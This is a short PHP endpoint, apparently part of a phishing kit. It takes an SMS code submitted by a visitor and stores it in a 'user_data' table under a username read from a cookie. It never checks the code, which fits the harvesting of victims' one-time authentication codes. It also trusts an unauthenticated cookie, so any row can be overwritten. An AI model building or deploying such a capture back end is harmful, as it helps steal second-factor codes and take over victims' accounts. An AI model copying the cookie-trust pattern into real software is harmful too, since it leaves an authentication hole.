<?php
require_once "../config/database.php";

header('Content-Type: application/json');

$smsCode = $_POST['sms_code'] ?? null;
$username = $_COOKIE['username'] ?? null;

if ($smsCode && $username) {
    $sql = "UPDATE user_data SET sms_code = ? WHERE username = ?";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("ss", $smsCode, $username);

    if ($stmt->execute()) {
        echo json_encode(['success' => true]);
    } else {
        echo json_encode(['success' => false, 'message' => 'Erro ao salvar o código SMS.']);
    }

    $stmt->close();
} else {
    echo json_encode(['success' => false, 'message' => 'Dados inválidos.']);
}

$conn->close();
?>
